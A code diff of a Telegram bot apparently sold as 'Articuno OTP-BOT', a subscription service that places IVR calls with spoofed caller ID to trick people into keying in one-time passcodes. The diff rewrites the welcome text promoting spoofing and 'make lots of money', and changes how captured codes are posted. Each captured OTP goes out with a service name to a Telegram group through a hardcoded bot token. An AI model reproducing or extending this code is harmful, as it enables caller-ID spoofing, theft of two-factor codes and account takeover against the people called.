@@ -147,24 +147,17 @@ def send_welcome(message):
     keyboard.add(item7,item6)
     keyboard.add(item8)
     mes2 = bot.send_photo(message.from_user.id,caption=f"""
-🌟 Welcome to Articuno OTP-BOT 🌟
+🚀 *ARTICUNO OTP - BOT* 🚀
 
-🌐 Hello {name} Welcome To The Articuno OTP - BOT. There Is Your Best Choice For OTP Captures 🌐
+i’m here to make IVR calls and capture DTMF inputs with any custom caller ID
 
-🚀 Up Time || 99.9% 🚀
+Requirements? 
 
-🔥 Cheap And Affordable Prices With Good & Unique Features Given By Only One - Articuno OTP 🔥
-
-Features 🔐 :
-
-📱 Pre-Build Modules 
-🗣️ Custom Caller ID/Spoofing
-🤖 Human & Robot Detection
-🧑‍💻 Custom Scripts
-📲 International Calling
-⌛️ Super Fast Response
-🔰 Accept Deny Buttons 
-☎️ Recall Button & Command
+📜 Check commands
+🛡 Read Terms and conditions 
+🔑 Buy a subscription 
+💰 Make lots of money
+📊 Get help & support 
 
 👇 To get started, please use the buttons below.""",reply_markup=keyboard,photo=open('starting_photp.jpg', 'rb')).message_id 
     last_message_ids[message.from_user.id] = mes2
@@ -295,24 +288,17 @@ def Start_back(message):
         keyboard.add(item7,item6)
         keyboard.add(item8)
         bot.edit_message_caption(chat_id=message.from_user.id,caption=f"""
-🌟 Welcome to Articuno OTP-BOT 🌟
+🚀 ARTICUNO OTP - BOT 🚀
 
-🌐 Hello {name} Welcome To The Articuno OTP - BOT. There Is Your Best Choice For OTP Captures 🌐
+i’m here to make IVR calls and capture DTMF inputs with any custom caller ID
 
-🚀 Up Time || 99.9% 🚀
+Requirements? 
 
-🔥 Cheap And Affordable Prices With Good & Unique Features Given By Only One - Articuno OTP 🔥
-
-Features 🔐 :
-
-📱 Pre-Build Modules 
-🗣️ Custom Caller ID/Spoofing
-🤖 Human & Robot Detection
-🧑‍💻 Custom Scripts
-📲 International Calling
-⌛️ Super Fast Response
-🔰 Accept Deny Buttons 
-☎️ Recall Button & Command
+📜 Check commands
+🛡 Read Terms and conditions 
+🔑 Buy a subscription 
+💰 Make lots of money
+📊 Get help & support 
 
 👇 To get started, please use the buttons below.""", message_id=last_message_ids[message.from_user.id],reply_markup=keyboard)
     except:
@@ -950,7 +936,7 @@ def custom_confirm1(message,otp_message):
 }
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
-        time.sleep(6)
+        time.sleep(10)
         callhangup(call_control_id)
 
 
@@ -1073,15 +1059,14 @@ def custom_prebuild_script_call(script_id,chatid):
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
             requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
-🚀 Articuno OTP Capture 🚀
-Another Call Was Successful 👤
+ARTICUNO OTP 📲
+➖➖➖➖➖➖
+Mode ➣ CustomCall  
+Service name ➣ {custom_sc_src[2]}
+OTP ➣  {otp2} ✅
+Capture by ➣ @{voices[12][0:3]+"****"+voices[12][-3:]}
 
-Custom OTP:- {otp2} ✅
-Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
-Service Name:- {custom_sc_src[2]} ⌛️
-Call Type:- CustomCall 📲
-
-Powered By:- @ArticunoOtpBot 🔐""")
+BOT (https://t.me/Articunootpbot) | GROUP (https://t.me/+tqRNlgotcnkxOGNl) | CHANNEL (https://t.me/+j5GqAN60aZhhMzM1)""")
     c.close()
     return 'Webhook received successfully!', 200
 
@@ -1245,15 +1230,14 @@ def aplha_prebuild_script_call(script_id,chatid):
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
             requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
-🚀 Articuno OTP Capture 🚀
-Another Call Was Successful 👤
+ARTICUNO OTP 📲
+➖➖➖➖➖➖
+Mode ➣ CustomCall  
+Service name ➣ {custom_sc_src[2]}
+OTP ➣  {otp2} ✅
+Capture by ➣ @{voices[12][0:3]+"****"+voices[12][-3:]}
 
-Custom OTP:- {otp2} ✅
-Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
-Service Name:- {custom_sc_src[2]} ⌛️
-Call Type:- Alpha-Numeric 📲
-
-Powered By:- @ArticunoOtpBot 🔐""")
+BOT (https://t.me/Articunootpbot) | GROUP (https://t.me/+tqRNlgotcnkxOGNl) | CHANNEL (https://t.me/+j5GqAN60aZhhMzM1)""")
          
            
         
